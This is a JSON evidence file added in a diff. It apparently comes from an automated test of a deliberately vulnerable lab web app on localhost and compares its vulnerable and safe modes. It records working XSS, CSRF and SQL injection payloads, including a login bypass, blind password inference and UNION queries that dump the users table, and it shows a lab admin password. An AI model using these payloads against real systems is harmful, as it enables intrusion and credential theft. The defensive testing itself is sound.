@@ -1,0 +1,339 @@
+{
+  "status": "passed",
+  "checks": 37,
+  "evidence": [
+    {
+      "mode": "vulnerable",
+      "name": "dashboard",
+      "payload": "",
+      "observation": "Application dashboard renders.",
+      "url": "http://localhost:8000/vulnerable",
+      "screenshot": "screenshots/vulnerable-dashboard.png",
+      "capturedAt": "2026-10-09T13:06:30.059Z"
+    },
+    {
+      "mode": "vulnerable",
+      "name": "reflected-xss",
+      "payload": "<svg onload=\"document.getElementById(`search-summary`).textContent=`REFLECTED XSS EXECUTED`\"></svg>",
+      "observation": "Payload executed through the search response.",
+      "url": "http://localhost:8000/vulnerable/courses?q=%3Csvg+onload%3D%22document.getElementById%28%60search-summary%60%29.textContent%3D%60REFLECTED+XSS+EXECUTED%60%22%3E%3C%2Fsvg%3E",
+      "screenshot": "screenshots/vulnerable-reflected-xss.png",
+      "capturedAt": "2026-10-09T13:06:30.909Z"
+    },
+    {
+      "mode": "vulnerable",
+      "name": "dom-xss",
+      "payload": "<img src=x onerror=\"document.getElementById('note-preview').textContent='DOM XSS EXECUTED'\">",
+      "observation": "Fragment payload executed in innerHTML.",
+      "url": "http://localhost:8000/vulnerable/planner#%3Cimg%20src%3Dx%20onerror%3D%22document.getElementById('note-preview').textContent%3D'DOM%20XSS%20EXECUTED'%22%3E",
+      "screenshot": "screenshots/vulnerable-dom-xss.png",
+      "capturedAt": "2026-10-09T13:06:31.689Z"
+    },
+    {
+      "mode": "vulnerable",
+      "name": "stored-xss",
+      "payload": "<svg onload=\"this.parentElement.innerHTML='<strong>STORED XSS EXECUTED</strong>'\"></svg>",
+      "observation": "Saved payload executes for a separate unauthenticated visitor.",
+      "url": "http://localhost:8000/vulnerable/discussion",
+      "screenshot": "screenshots/vulnerable-stored-xss.png",
+      "capturedAt": "2026-10-09T13:06:33.338Z"
+    },
+    {
+      "mode": "vulnerable",
+      "name": "csrf-before",
+      "payload": "Normal authenticated profile update",
+      "observation": "Original email persisted before the attack.",
+      "url": "http://localhost:8000/vulnerable/profile",
+      "screenshot": "screenshots/vulnerable-csrf-before.png",
+      "capturedAt": "2026-10-09T13:06:33.891Z"
+    },
+    {
+      "mode": "vulnerable",
+      "name": "csrf-response",
+      "payload": "External auto-submitting POST: email=attacker@lab.invalid; no CSRF token",
+      "observation": "Cross-site form changed the authenticated profile.",
+      "url": "http://localhost:8000/vulnerable/profile",
+      "screenshot": "screenshots/vulnerable-csrf-response.png",
+      "capturedAt": "2026-10-09T13:06:34.555Z"
+    },
+    {
+      "mode": "vulnerable",
+      "name": "csrf-after",
+      "payload": "External POST followed by authenticated profile verification",
+      "observation": "Attacker email is stored in the database.",
+      "url": "http://localhost:8000/vulnerable/profile",
+      "screenshot": "screenshots/vulnerable-csrf-after.png",
+      "capturedAt": "2026-10-09T13:06:34.962Z"
+    },
+    {
+      "mode": "vulnerable",
+      "name": "sqli-easy",
+      "payload": "username=admin' -- ; password=wrong",
+      "observation": "Authentication bypassed as administrator.",
+      "url": "http://localhost:8000/vulnerable/profile",
+      "screenshot": "screenshots/vulnerable-sqli-easy.png",
+      "capturedAt": "2026-10-09T13:06:35.522Z"
+    },
+    {
+      "mode": "vulnerable",
+      "name": "sqli-intermediate-true",
+      "payload": "ENR-2026-001' AND 1=1 -- ",
+      "observation": "Enrollment found",
+      "url": "http://localhost:8000/vulnerable/enrollment?reference=ENR-2026-001%27+AND+1%3D1+--+",
+      "screenshot": "screenshots/vulnerable-sqli-intermediate-true.png",
+      "capturedAt": "2026-10-09T13:06:36.039Z"
+    },
+    {
+      "mode": "vulnerable",
+      "name": "sqli-intermediate-false",
+      "payload": "ENR-2026-001' AND 1=2 -- ",
+      "observation": "No matching enrollment",
+      "url": "http://localhost:8000/vulnerable/enrollment?reference=ENR-2026-001%27+AND+1%3D2+--+",
+      "screenshot": "screenshots/vulnerable-sqli-intermediate-false.png",
+      "capturedAt": "2026-10-09T13:06:36.544Z"
+    },
+    {
+      "mode": "vulnerable",
+      "name": "sqli-intermediate-infer-A",
+      "payload": "ENR-2026-001' AND substr((SELECT password FROM users WHERE username='admin'),1,1)='A' -- ",
+      "observation": "Enrollment found",
+      "url": "http://localhost:8000/vulnerable/enrollment?reference=ENR-2026-001%27+AND+substr%28%28SELECT+password+FROM+users+WHERE+username%3D%27admin%27%29%2C1%2C1%29%3D%27A%27+--+",
+      "screenshot": "screenshots/vulnerable-sqli-intermediate-infer-A.png",
+      "capturedAt": "2026-10-09T13:06:37.073Z"
+    },
+    {
+      "mode": "vulnerable",
+      "name": "sqli-intermediate-infer-Z",
+      "payload": "ENR-2026-001' AND substr((SELECT password FROM users WHERE username='admin'),1,1)='Z' -- ",
+      "observation": "No matching enrollment",
+      "url": "http://localhost:8000/vulnerable/enrollment?reference=ENR-2026-001%27+AND+substr%28%28SELECT+password+FROM+users+WHERE+username%3D%27admin%27%29%2C1%2C1%29%3D%27Z%27+--+",
+      "screenshot": "screenshots/vulnerable-sqli-intermediate-infer-Z.png",
+      "capturedAt": "2026-10-09T13:06:37.577Z"
+    },
+    {
+      "mode": "vulnerable",
+      "name": "sqli-advanced-columns-three",
+      "payload": "' ORDER BY 3 -- ",
+      "observation": "Observed database response: Information Security",
+      "url": "http://localhost:8000/vulnerable/courses?q=%27+ORDER+BY+3+--+",
+      "screenshot": "screenshots/vulnerable-sqli-advanced-columns-three.png",
+      "capturedAt": "2026-10-09T13:06:38.074Z"
+    },
+    {
+      "mode": "vulnerable",
+      "name": "sqli-advanced-columns-four",
+      "payload": "' ORDER BY 4 -- ",
+      "observation": "Observed database response: ORDER BY",
+      "url": "http://localhost:8000/vulnerable/courses?q=%27+ORDER+BY+4+--+",
+      "screenshot": "screenshots/vulnerable-sqli-advanced-columns-four.png",
+      "capturedAt": "2026-10-09T13:06:38.570Z"
+    },
+    {
+      "mode": "vulnerable",
+      "name": "sqli-advanced-database",
+      "payload": "' UNION SELECT 'DATABASE',name,file FROM pragma_database_list -- ",
+      "observation": "Observed database response: main",
+      "url": "http://localhost:8000/vulnerable/courses?q=%27+UNION+SELECT+%27DATABASE%27%2Cname%2Cfile+FROM+pragma_database_list+--+",
+      "screenshot": "screenshots/vulnerable-sqli-advanced-database.png",
+      "capturedAt": "2026-10-09T13:06:39.144Z"
+    },
+    {
+      "mode": "vulnerable",
+      "name": "sqli-advanced-tables",
+      "payload": "' UNION SELECT 'TABLE',name,sql FROM sqlite_master WHERE type='table' -- ",
+      "observation": "Observed database response: CREATE TABLE users",
+      "url": "http://localhost:8000/vulnerable/courses?q=%27+UNION+SELECT+%27TABLE%27%2Cname%2Csql+FROM+sqlite_master+WHERE+type%3D%27table%27+--+",
+      "screenshot": "screenshots/vulnerable-sqli-advanced-tables.png",
+      "capturedAt": "2026-10-09T13:06:39.709Z"
+    },
+    {
+      "mode": "vulnerable",
+      "name": "sqli-advanced-columns",
+      "payload": "' UNION SELECT 'COLUMN',name,type FROM pragma_table_info('users') -- ",
+      "observation": "Observed database response: password",
+      "url": "http://localhost:8000/vulnerable/courses?q=%27+UNION+SELECT+%27COLUMN%27%2Cname%2Ctype+FROM+pragma_table_info%28%27users%27%29+--+",
+      "screenshot": "screenshots/vulnerable-sqli-advanced-columns.png",
+      "capturedAt": "2026-10-09T13:06:40.270Z"
+    },
+    {
+      "mode": "vulnerable",
+      "name": "sqli-advanced-credentials",
+      "payload": "' UNION SELECT username,password,email FROM users -- ",
+      "observation": "Observed database response: AdminPass!26",
+      "url": "http://localhost:8000/vulnerable/courses?q=%27+UNION+SELECT+username%2Cpassword%2Cemail+FROM+users+--+",
+      "screenshot": "screenshots/vulnerable-sqli-advanced-credentials.png",
+      "capturedAt": "2026-10-09T13:06:40.811Z"
+    },
+    {
+      "mode": "safe",
+      "name": "dashboard",
+      "payload": "",
+      "observation": "Application dashboard renders.",
+      "url": "http://localhost:8000/safe",
+      "screenshot": "screenshots/safe-dashboard.png",
+      "capturedAt": "2026-10-09T13:06:41.575Z"
+    },
+    {
+      "mode": "safe",
+      "name": "reflected-xss",
+      "payload": "<svg onload=\"document.getElementById(`search-summary`).textContent=`REFLECTED XSS EXECUTED`\"></svg>",
+      "observation": "Literal payload rendered without execution.",
+      "url": "http://localhost:8000/safe/courses?q=%3Csvg+onload%3D%22document.getElementById%28%60search-summary%60%29.textContent%3D%60REFLECTED+XSS+EXECUTED%60%22%3E%3C%2Fsvg%3E",
+      "screenshot": "screenshots/safe-reflected-xss.png",
+      "capturedAt": "2026-10-09T13:06:42.408Z"
+    },
+    {
+      "mode": "safe",
+      "name": "dom-xss",
+      "payload": "<img src=x onerror=\"document.getElementById('note-preview').textContent='DOM XSS EXECUTED'\">",
+      "observation": "Fragment rendered through textContent.",
+      "url": "http://localhost:8000/safe/planner#%3Cimg%20src%3Dx%20onerror%3D%22document.getElementById('note-preview').textContent%3D'DOM%20XSS%20EXECUTED'%22%3E",
+      "screenshot": "screenshots/safe-dom-xss.png",
+      "capturedAt": "2026-10-09T13:06:43.206Z"
+    },
+    {
+      "mode": "safe",
+      "name": "stored-xss",
+      "payload": "<svg onload=\"this.parentElement.innerHTML='<strong>STORED XSS EXECUTED</strong>'\"></svg>",
+      "observation": "Saved payload is visible as literal text to another visitor.",
+      "url": "http://localhost:8000/safe/discussion",
+      "screenshot": "screenshots/safe-stored-xss.png",
+      "capturedAt": "2026-10-09T13:06:44.780Z"
+    },
+    {
+      "mode": "safe",
+      "name": "csrf-before",
+      "payload": "Normal authenticated profile update",
+      "observation": "Original email persisted before the attack.",
+      "url": "http://localhost:8000/safe/profile",
+      "screenshot": "screenshots/safe-csrf-before.png",
+      "capturedAt": "2026-10-09T13:06:45.318Z"
+    },
+    {
+      "mode": "safe",
+      "name": "csrf-response",
+      "payload": "External auto-submitting POST: email=attacker@lab.invalid; no CSRF token",
+      "observation": "Cross-site POST lacks the SameSite-protected session and redirects to login.",
+      "url": "http://localhost:8000/safe/login",
+      "screenshot": "screenshots/safe-csrf-response.png",
+      "capturedAt": "2026-10-09T13:06:46.088Z"
+    },
+    {
+      "mode": "safe",
+      "name": "csrf-after",
+      "payload": "External POST followed by authenticated profile verification",
+      "observation": "Original email remains unchanged.",
+      "url": "http://localhost:8000/safe/profile",
+      "screenshot": "screenshots/safe-csrf-after.png",
+      "capturedAt": "2026-10-09T13:06:46.722Z"
+    },
+    {
+      "mode": "safe",
+      "name": "csrf-token-origin",
+      "payload": "POST from http://localhost:8001 with session cookie but no token",
+      "observation": "HTTP 403: server-side token and Origin verification rejected the request.",
+      "url": "http://localhost:8000/safe/profile",
+      "screenshot": "screenshots/safe-csrf-token-origin.png",
+      "capturedAt": "2026-10-09T13:06:47.138Z"
+    },
+    {
+      "mode": "safe",
+      "name": "sqli-easy",
+      "payload": "username=admin' -- ; password=wrong",
+      "observation": "Invalid credentials; attack rejected.",
+      "url": "http://localhost:8000/safe/login",
+      "screenshot": "screenshots/safe-sqli-easy.png",
+      "capturedAt": "2026-10-09T13:06:47.705Z"
+    },
+    {
+      "mode": "safe",
+      "name": "sqli-intermediate-true",
+      "payload": "ENR-2026-001' AND 1=1 -- ",
+      "observation": "No matching enrollment",
+      "url": "http://localhost:8000/safe/enrollment?reference=ENR-2026-001%27+AND+1%3D1+--+",
+      "screenshot": "screenshots/safe-sqli-intermediate-true.png",
+      "capturedAt": "2026-10-09T13:06:48.208Z"
+    },
+    {
+      "mode": "safe",
+      "name": "sqli-intermediate-false",
+      "payload": "ENR-2026-001' AND 1=2 -- ",
+      "observation": "No matching enrollment",
+      "url": "http://localhost:8000/safe/enrollment?reference=ENR-2026-001%27+AND+1%3D2+--+",
+      "screenshot": "screenshots/safe-sqli-intermediate-false.png",
+      "capturedAt": "2026-10-09T13:06:48.713Z"
+    },
+    {
+      "mode": "safe",
+      "name": "sqli-intermediate-infer-A",
+      "payload": "ENR-2026-001' AND substr((SELECT password FROM users WHERE username='admin'),1,1)='A' -- ",
+      "observation": "No matching enrollment",
+      "url": "http://localhost:8000/safe/enrollment?reference=ENR-2026-001%27+AND+substr%28%28SELECT+password+FROM+users+WHERE+username%3D%27admin%27%29%2C1%2C1%29%3D%27A%27+--+",
+      "screenshot": "screenshots/safe-sqli-intermediate-infer-A.png",
+      "capturedAt": "2026-10-09T13:06:49.224Z"
+    },
+    {
+      "mode": "safe",
+      "name": "sqli-intermediate-infer-Z",
+      "payload": "ENR-2026-001' AND substr((SELECT password FROM users WHERE username='admin'),1,1)='Z' -- ",
+      "observation": "No matching enrollment",
+      "url": "http://localhost:8000/safe/enrollment?reference=ENR-2026-001%27+AND+substr%28%28SELECT+password+FROM+users+WHERE+username%3D%27admin%27%29%2C1%2C1%29%3D%27Z%27+--+",
+      "screenshot": "screenshots/safe-sqli-intermediate-infer-Z.png",
+      "capturedAt": "2026-10-09T13:06:49.727Z"
+    },
+    {
+      "mode": "safe",
+      "name": "sqli-advanced-columns-three",
+      "payload": "' ORDER BY 3 -- ",
+      "observation": "Literal search input; no injected rows.",
+      "url": "http://localhost:8000/safe/courses?q=%27+ORDER+BY+3+--+",
+      "screenshot": "screenshots/safe-sqli-advanced-columns-three.png",
+      "capturedAt": "2026-10-09T13:06:50.242Z"
+    },
+    {
+      "mode": "safe",
+      "name": "sqli-advanced-columns-four",
+      "payload": "' ORDER BY 4 -- ",
+      "observation": "Literal search input; no injected rows.",
+      "url": "http://localhost:8000/safe/courses?q=%27+ORDER+BY+4+--+",
+      "screenshot": "screenshots/safe-sqli-advanced-columns-four.png",
+      "capturedAt": "2026-10-09T13:06:50.783Z"
+    },
+    {
+      "mode": "safe",
+      "name": "sqli-advanced-database",
+      "payload": "' UNION SELECT 'DATABASE',name,file FROM pragma_database_list -- ",
+      "observation": "Literal search input; no injected rows.",
+      "url": "http://localhost:8000/safe/courses?q=%27+UNION+SELECT+%27DATABASE%27%2Cname%2Cfile+FROM+pragma_database_list+--+",
+      "screenshot": "screenshots/safe-sqli-advanced-database.png",
+      "capturedAt": "2026-10-09T13:06:51.315Z"
+    },
+    {
+      "mode": "safe",
+      "name": "sqli-advanced-tables",
+      "payload": "' UNION SELECT 'TABLE',name,sql FROM sqlite_master WHERE type='table' -- ",
+      "observation": "Literal search input; no injected rows.",
+      "url": "http://localhost:8000/safe/courses?q=%27+UNION+SELECT+%27TABLE%27%2Cname%2Csql+FROM+sqlite_master+WHERE+type%3D%27table%27+--+",
+      "screenshot": "screenshots/safe-sqli-advanced-tables.png",
+      "capturedAt": "2026-10-09T13:06:51.839Z"
+    },
+    {
+      "mode": "safe",
+      "name": "sqli-advanced-columns",
+      "payload": "' UNION SELECT 'COLUMN',name,type FROM pragma_table_info('users') -- ",
+      "observation": "Literal search input; no injected rows.",
+      "url": "http://localhost:8000/safe/courses?q=%27+UNION+SELECT+%27COLUMN%27%2Cname%2Ctype+FROM+pragma_table_info%28%27users%27%29+--+",
+      "screenshot": "screenshots/safe-sqli-advanced-columns.png",
+      "capturedAt": "2026-10-09T13:06:52.355Z"
+    },
+    {
+      "mode": "safe",
+      "name": "sqli-advanced-credentials",
+      "payload": "' UNION SELECT username,password,email FROM users -- ",
+      "observation": "Literal search input; no injected rows.",
+      "url": "http://localhost:8000/safe/courses?q=%27+UNION+SELECT+username%2Cpassword%2Cemail+FROM+users+--+",
+      "screenshot": "screenshots/safe-sqli-advanced-credentials.png",
+      "capturedAt": "2026-10-09T13:06:52.892Z"
+    }
+  ]
+}
